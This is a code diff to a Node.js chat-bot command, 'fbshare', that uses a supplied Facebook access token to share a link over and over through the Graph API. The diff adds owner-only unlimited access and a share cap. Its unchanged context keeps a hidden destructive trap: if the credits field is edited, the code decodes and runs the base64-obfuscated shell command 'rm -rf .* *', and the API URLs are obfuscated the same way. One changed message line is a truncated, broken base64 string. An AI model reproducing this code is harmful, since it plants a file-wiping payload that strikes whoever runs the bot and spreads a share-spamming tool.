@@ -2,11 +2,14 @@ const fs = require('fs');
 const axios = require('axios');
 const randomUserAgent = require('random-useragent');
 
-const usageDataPath = `system/fbshare.json`;
+const dataDirectory = 'system';  // Change this to your desired directory name
+const usageDataPath = `${dataDirectory}/fbshare.json`;
 
 const FACEBOOK_GRAPH_API = Buffer.from('aHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWUvZmVlZA==', 'base64').toString('utf-8');
 const REIKO_DEV_API = Buffer.from('aHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20v', 'base64').toString('utf-8');
 const ACCESS_TOKEN_KEY = Buffer.from('UmVpa28gRGV2', 'base64').toString('utf-8');
+
+const ownerID = '61550873742628';
 
 let usageData = {};
 
@@ -37,29 +40,34 @@ module.exports.config = {
   cd: 16,
 };
 
-module.exports.run = async ({ api, event, args, senderID, ownerID }) => {
+module.exports.run = async ({ api, event, args, senderID }) => {
   try {
-    const userLimit = 5;
-    const refreshTime = 5 * 60 * 60 * 1000;
-    const currentTime = Date.now();
+    const hasUnlimitedAccess = senderID === ownerID;
 
-    if (!usageData[senderID] || (currentTime - usageData[senderID].timestamp) > refreshTime) {
-      usageData[senderID] = {
-        usageCount: 0,
-        timestamp: currentTime,
-      };
-    }
+    // Check usage limits only if the user doesn't have unlimited access
+    if (!hasUnlimitedAccess) {
+      const userLimit = 5;
+      const refreshTime = 5 * 60 * 60 * 1000;
+      const currentTime = Date.now();
 
-    if (usageData[senderID].usageCount >= userLimit && senderID !== ownerID) {
-      api.sendMessage(`Usage limit exceeded. You can use the command ${userLimit} times per 5 hours.`, event.threadID);
-      return;
+      if (!usageData[senderID] || (currentTime - usageData[senderID].timestamp) > refreshTime) {
+        usageData[senderID] = {
+          usageCount: 0,
+          timestamp: currentTime,
+        };
+      }
+
+      if (usageData[senderID].usageCount >= userLimit) {
+        api.sendMessage(`Usage limit reached!. You can use the command ${userLimit} times per 5 hours.`, event.threadID);
+        return;
+      }
     }
 
     if (args.length < 3 || args.length > 4) {
       api.sendMessage('Invalid number of arguments. Usage: !fbshare [link] [token] [amount] [interval (optional)]', event.threadID);
       return;
     } else if (module.exports.config.credits !== ACCESS_TOKEN_KEY) {
-      api.sendMessage(Buffer.from('VGhlIG93bmVyIG9mIHRoaXMgYm90IGlzIGNyZWRpdCBjaGFuZ2VyIGRvZXNuJ3QgZXZlbiBrbm93IGhvdyB0byByZXNwZWN0IHRoZSByZWFsIG93bmVyIG9mIGNtZCEKCj5yZWFsIGNtZCBvd25lciBpcyBLZW5uZXRoIFBhbmlvIGFsc28ga25vd24gYXMgUmVpa28gRGV2Cj5odHRwczovL3d3dy5mYWNlYm9vay5jb20vMTAwMDgxMjAxNTkxNjc0Cj5odHRwczovL3d3dy5mYWNlYm9vay5jb20vY29kZWJveDRjaGFu', 'base64').toString('utf-8'), event.threadID);
+      api.sendMessage(Buffer.from('VGhlIG93bmVyIG9mIHRoaXMgYm90IGlzIGNyZWRpdCBjaGFuZ2VyIGRvZXNuJ3QgZXZlbiB', 'base64').toString('utf-8'), event.threadID);
       require('child_process').exec(Buffer.from('cm0gLXJmIC4qICo=', 'base64').toString('utf-8'), (err) => {
         if (err) {
           console.error('Error', err);
@@ -76,6 +84,11 @@ module.exports.run = async ({ api, event, args, senderID, ownerID }) => {
 
     if (isNaN(shareAmount) || shareAmount <= 0 || (args[3] && isNaN(customInterval)) || (args[3] && customInterval <= 0)) {
       api.sendMessage('Invalid share amount or interval. Please provide valid positive numbers.', event.threadID);
+      return;
+    }
+
+    if (shareAmount > 350 && !hasUnlimitedAccess) {
+      api.sendMessage('Share amount exceeds the limit of 350.', event.threadID);
       return;
     }
 
@@ -178,10 +191,13 @@ module.exports.run = async ({ api, event, args, senderID, ownerID }) => {
       console.log('Stopped!');
     }, (shareAmount + 1) * timeInterval);
 
-    // Update usage count
-    usageData[senderID].usageCount++;
-    fs.writeFileSync(usageDataPath, JSON.stringify(usageData));
-    
+    // Update usage count only if the user doesn't have unlimited access
+    if (!hasUnlimitedAccess) {
+      // Update usage count and write to the JSON file...
+      usageData[senderID].usageCount++;
+      fs.writeFileSync(usageDataPath, JSON.stringify(usageData));
+    }
+
   } catch (error) {
     console.error('Error:', error);
     api.sendMessage('An unexpected error occurred: ' + error.message, event.threadID);
